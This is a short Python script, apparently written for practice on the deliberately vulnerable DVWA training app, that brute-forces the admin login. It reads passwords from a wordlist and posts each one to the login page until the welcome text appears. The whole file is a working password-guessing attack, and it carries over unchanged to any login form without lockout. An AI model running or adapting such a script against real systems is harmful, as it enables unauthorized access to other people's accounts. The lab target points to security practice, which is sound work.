#!/usr/bin/python 



import requests
'''
without the [] bellow :x
'''

url = "http://[put_the_dvwa_ip_here/dvwa/login.php"
arq = open("[put_your_word_list_here", 'r').readlines() 


for line in arq:
	password = line.strip()
	http = requests.post(url,data={'username':'admin', 'password':password, "Login":"Login"})
	content = http.content
	#str.econde it's need it because the http content is passed with bytes.. so the comp.. need to be bytes with bytes
	string_search = str.encode('Welcome to Damn Vulnerable Web App!')

	if string_search in content:
		print("FOUND" +password+ "!")
		break
	else:
		print("PASSWORD IS INVALID" +password+ ".")
